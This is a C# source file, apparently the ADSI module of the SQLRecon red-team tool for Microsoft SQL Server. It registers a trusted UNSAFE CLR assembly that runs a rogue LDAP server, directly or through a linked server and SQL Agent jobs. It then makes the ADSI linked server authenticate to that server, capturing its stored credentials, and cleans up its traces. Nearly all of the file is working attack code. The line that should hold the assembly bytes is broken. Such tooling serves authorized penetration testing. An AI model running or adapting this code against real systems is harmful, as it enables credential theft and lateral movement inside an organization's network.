using System;
using System.Data.SqlClient;
using System.Threading.Tasks;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal class ADSI
    {
        private static readonly AgentJobs _agentJobs = new();
        private static readonly Configure _config = new();
        private static readonly PrintUtils _print = new();
        private static readonly RandomString _rs = new();
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// The Standard method loads a .NET assembly, which executes a local LDAP
        /// server on a remote SQL server instance. The LDAP server is started before an
        /// authentication request is sent to it to retrieve stored ADSI credentials.
        /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
        /// </summary>
        /// <param name="con"></param>
        /// <param name="adsiServer"></param>
        /// <param name="port"></param>
        public void Standard(SqlConnection con, string adsiServer, string port)
        {
            // First check to see if clr integration is enabled.
            string sqlOutput = _config.ModuleStatus(con, "clr enabled");

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (enableclr).", true);
                // Go no futher.
                return;
            }

            // Obtain a list of all linked servers.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;");

            // Check to see if the ADSI server exists in the linked server list.
            if (!sqlOutput.ToLower().Contains(adsiServer.ToLower()))
            {
                _print.Error(String.Format("{0} does not exist.", adsiServer), true);
                // Go no futher.
                return;
            }

            string[] dllArr = _ldapServerAssembly();
            string dllBytes = dllArr[0];
            string dllHash = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }

            // Generate a new random string for the trusted hash path and the CLR function name.
            string dllPath = _rs.Generate(8);
            string assem = "ldapServer";
            string function = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("LDAP server hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteQuery(con, "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N'" + dllPath +
                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for LDAP server assembly to sys.trusted_assemblies with a random name of '{0}'.", dllPath), true);
            }
            else
            {
                _print.Error("Unable to add LDAP server hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }

            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteQuery(con, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteQuery(con, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");

            // Create a new custom assembly with the randomly generated name.
            _print.Status(string.Format("Creating a new LDAP server assembly with the name '{0}'.", assem), true);

            _sqlQuery.ExecuteQuery(con, "use msdb; CREATE ASSEMBLY " + assem + " AUTHORIZATION [dbo] FROM 0x" + dllBytes + " WITH PERMISSION_SET = UNSAFE;");

            // Check to see if the LDAP server assembly has been created.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.assemblies");

            if (sqlOutput.ToLower().Contains(assem.ToLower()))
            {
                _print.Success(string.Format("Created a new LDAP server assembly with the name '{0}'.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new LDAP server assembly. Cleaning up."), true);
                _sqlQuery.ExecuteQuery(con, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteQuery(con, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }

            /* Create a CLR runtime routine based on the randomly generated function name.
            *
            * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
            * as this will execute the query as a block. In MS SQL manager, this command
            * will need to be executed with a GO before it, and a GO after it a
            *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
            */
            _print.Status(string.Format("Loading LDAP server assembly into a new CLR runtime routine '{0}'.", function), true);

            try
            {
                SqlCommand query = new(
                "CREATE FUNCTION [dbo]." + function + "(@port int) RETURNS NVARCHAR(MAX) " +
                "AS EXTERNAL NAME " + assem + ".[ldapAssembly.LdapSrv].listen;", con);

                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            // Verify that the LDAP server assembly has been created.
            sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT * FROM sys.assembly_modules");

            if (sqlOutput.ToLower().Contains("ldapsrv"))
            {
                _print.Success(string.Format("Created '[{0}].[ldapAssembly.LdapSrv].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load LDAP server assembly into custom CLR runtime routine. Cleaning up.", true);
                _sqlQuery.ExecuteQuery(con, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
                _sqlQuery.ExecuteQuery(con, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no futher.
                return;
            }

            _print.Status(string.Format("Starting a local LDAP server on port {0}.", port), true);

            /* Start the LDAP server, which will store the credentias in 'sqlOutput'.
            * This is a long running query that will hang the 'con' connection object until
            * an LDAP connection has been established.
            */
            Task.Run(() =>
                sqlOutput = _sqlQuery.ExecuteCustomQuery(con, "SELECT dbo." + function + "(" + port + ");")
            );

            _print.Status("Executing LDAP solicitation ...", true);

            /* Create a new SQL connection object as we need to have a second
            *  connection to the database.This is because the first
            *  connection object ('con') is being used to run the LDAP server.
            */
            SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();

            string queryTwo = "SELECT * FROM ''LDAP://localhost:" + port + "'' ";

            // This is not a typo, the query does need to be executed twice in order for the function and assembly to be removed cleanly.
            _sqlQuery.ExecuteTunnelCustomQuery(conTwo, adsiServer, queryTwo);
            _sqlQuery.ExecuteTunnelCustomQuery(conTwo, adsiServer, queryTwo);

            // Check to see if the credentials have been obtained.
            if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
            {
                _print.IsOutputEmpty(sqlOutput, true);
            }
            else
            {
                _print.Success(string.Format("Obtained ADSI link credentials.{0}", sqlOutput.Replace("column0", "")), true);
            }

            // Cleaning up.
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', function '{1}' and hash from sys.trusted_assembly.", assem, function), true);
            _sqlQuery.ExecuteQuery(conTwo, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteQuery(conTwo, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteQuery(conTwo, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }


        /// <summary>
        /// The Linked method loads a .NET assembly, which executes a local LDAP
        /// server on a remote link SQL server instance/
        /// The LDAP server is started before an authentication request is
        /// sent to it to retrieve stored ADSI credentials. The authentication request is sent
        /// using SQL agent jobs.
        /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords/
        /// </summary>
        /// <param name="con"></param>
        /// <param name="adsiServer"></param>
        /// <param name="port"></param>
        /// <param name="linkedSqlServer"></param>
        /// <param name="sqlServer"></param>
        public void Linked(SqlConnection con, string adsiServer, string port, string linkedSqlServer, string sqlServer)
        {
            // First check to see if rpc is enabled.
            string sqlOutput = _config.ModuleStatus(con, "rpc", "null", linkedSqlServer);

            if (!sqlOutput.Contains("1"))
            {
                _print.Error(string.Format("You need to enable RPC for {1} on {0} (enablerpc -o {1}).",
                    sqlServer, linkedSqlServer), true);
                // Go no futher.
                return;
            }

            // Then check to see if clr integration is enabled.
            sqlOutput = _config.LinkedModuleStatus(con, "clr enabled", linkedSqlServer);

            if (!sqlOutput.Contains("1"))
            {
                _print.Error("You need to enable CLR (enableclr).", true);
                // Go no futher.
                return;
            }

            string[] dllArr = _ldapServerAssembly();
            string dllBytes = dllArr[0];
            string dllHash = dllArr[1];

            if (dllHash.Length != 128)
            {
                _print.Error("Unable to calculate hash for DLL.", true);
                // Go no further.
                return;
            }

            // Generate a new random string for the trusted hash path and the CLR function name.
            string dllPath = _rs.Generate(8);
            string assem = "ldapServer";
            string function = _rs.Generate(8);

            // Check to see if the hash already exists.
            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.trusted_assemblies where hash = 0x" + dllHash + ";");

            if (sqlOutput.Contains("System.Byte[]"))
            {
                _print.Status("LDAP server hash already exists in sys.trusted_assemblies. Deleting it before moving forward.", true);
                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                    "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
            }

            // Add the DLL hash into the trusted_assemblies table on the SQL Server. Set a random name for the DLL hash.
            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                "EXEC sp_add_trusted_assembly 0x" + dllHash + ",N''" + dllPath +
                    ", version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil'';");

            // Verify that the SHA-512 hash has been added.
            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.trusted_assemblies;");

            if (sqlOutput.Contains(dllPath))
            {
                _print.Success(string.Format("Added SHA-512 hash for LDAP server assembly to sys.trusted_assemblies with a random name of '{0}'.", dllPath), true);
            }
            else
            {
                _print.Error("Unable to add LDAP server hash to sys.trusted_assemblies.", true);
                // Go no further.
                return;
            }

            // Drop the procedure name, which is the same as the function name if it exists already.
            // Drop the assembly name if it exists already.
            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");

            // Create a new custom assembly with the randomly generated name.
            _print.Status(string.Format("Creating a new LDAP server assembly with the name '{0}'.", assem), true);

            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer,
                "CREATE ASSEMBLY " + assem + " AUTHORIZATION [dbo] FROM 0x" + dllBytes +
                          " WITH PERMISSION_SET = UNSAFE;");

            // Check to see if the custom assembly has been created
            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.assemblies;");

            if (sqlOutput.ToLower().Contains(assem.ToLower()))
            {
                _print.Success(string.Format("Created a new LDAP server assembly with the name '{0}'.", assem), true);
            }
            else
            {
                _print.Error(string.Format("Unable to create a new LDAP server assembly. Cleaning up."), true);
                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                // Go no further.
                return;
            }

            /* Create a CLR runtime routine based on the randomly generated function name.
             *
             * Interestingly, this query needs to be executed with 'ExecuteNonQuery'
             * as this will execute the query as a block. In MS SQL manager, this command
             * will need to be executed with a GO before it, and a GO after it a
             *'CREATE/ALTER PROCEDURE' must be the first statement in a query batch.
             */

            _print.Status(string.Format("Loading LDAP server assembly into a new CLR runtime routine '{0}'.", function), true);

            try
            {
                SqlCommand query = new("EXECUTE ('" +
                    "CREATE FUNCTION [dbo]." + function + "(@port int) RETURNS NVARCHAR(MAX) " +
                    "AS EXTERNAL NAME " + assem + ".[ldapAssembly.LdapSrv].listen;" +
                    "') AT " + linkedSqlServer + ";", con);

                query.ExecuteNonQuery();
            }
            catch (Exception e)
            {
                _print.Error(string.Format("{0}", e), true);
            }

            // Verify that the LDAP server assembly has been created.
            sqlOutput = _sqlQuery.ExecuteTunnelCustomQuery(con, linkedSqlServer,
                "SELECT * FROM sys.assembly_modules");

            if (sqlOutput.ToLower().Contains("ldapsrv"))
            {
                _print.Success(string.Format("Created '[{0}].[ldapAssembly.LdapSrv].[{1}]'.", assem, function), true);
            }
            else
            {
                _print.Error("Unable to load LDAP server assembly into custom CLR runtime routine. Cleaning up.", true);
                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
                _sqlQuery.ExecuteTunnelCustomQueryRpcExec(con, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
                // Go no futher.
                return;

            }

            _print.Status(string.Format("Starting a local LDAP server on port {0}.", port), true);

            /* Start the LDAP server, which will store the credentias in 'sqlOutput'.
            * This is a long running query that will hang the 'con' connection object until
            * an LDAP connection has been established.
            */
            Task.Run(() =>
                sqlOutput = _sqlQuery.ExecuteTunnelQuery(con, linkedSqlServer, "SELECT dbo." + function + "(" + port + ");")
            );

            _print.Status("Executing LDAP solicitation using SQL agent jobs...", true);

            /* Create a new SQL connection object as we need to have a second
            *  connection to the database.This is because the first
            *  connection object ('con') is being used to run the LDAP server.
            */
            SqlConnection conTwo = SetAuthenticationType.CreateSqlConnectionObject();

            /* At this point, we can send a SQL query which will send a request to the local LDAP server.
             * This is tricky as it requires one of two methods:
             * - EXECUTE - which requires RPC to be enabled on the secondary link server.
             * - OpenQuery within an OpenQuery - which doesn't work.
             *
             * Based on this, a nice work around is to leverage the SQL agent on the remote linked server
             * to queue up an OpenQuery that we can use to execute on the linked server, against the ADSI server.
             */

            _agentJobs.Linked(conTwo, linkedSqlServer, "TSQL",
                "SELECT * FROM OpenQuery( " + adsiServer + ", '''' SELECT * FROM ''''''''LDAP://localhost:" + port + "'''''''' '''');"
                , sqlServer);

            // Check to see if the credentials have been obtained.
            if (_print.IsOutputEmpty(sqlOutput).Contains("No Results"))
            {
                _print.IsOutputEmpty(sqlOutput, true);
            }
            else
            {
                _print.Success(string.Format("Obtained ADSI link credentials.\n{0}", sqlOutput.Replace("column0", "")), true);
            }

            // Cleaning up.
            _print.Status(string.Format("Cleaning up. Deleting assembly '{0}', function '{1}' and hash from sys.trusted_assembly.", assem, function), true);
            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP FUNCTION IF EXISTS " + function + ";");
            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(conTwo, linkedSqlServer, "use msdb; DROP ASSEMBLY IF EXISTS " + assem + ";");
            _sqlQuery.ExecuteTunnelCustomQueryRpcExec(conTwo, linkedSqlServer, "EXEC sp_drop_trusted_assembly 0x" + dllHash + ";");
        }

        /// <summary>
        /// The _ldapServerAssembly function contains the .NET assembly for an LDAP server
        /// in SQL byte format, as well as the SHA-512 hash for the assembly.
        /// The code can be found here: https://github.com/blackarrowsec/redteam-research/blob/master/MSSQL%20linked%20servers%20-%20ADSI/ldapServer.cs
        /// </summary>
        /// <returns></returns>
        private string[] _ldapServerAssembly()
        {
            string[] dllArr = new string[2];

            // This is the .NET assembly for an LDAP server in SQL byte format.
            dllArr

            // This is the SHA-512 hash for the LDAP server .NET assembly in SQL byte format.
            dllArr[1] = "45077873b42284716609bf5d675d98ffa13c20e53008bb3d3f26c0971bcf7d9adf80c2db84300a81168e63d902532235c8daf852d58f9f2eadcb517fb5b83fb9";

            return dllArr;
        }
    }
}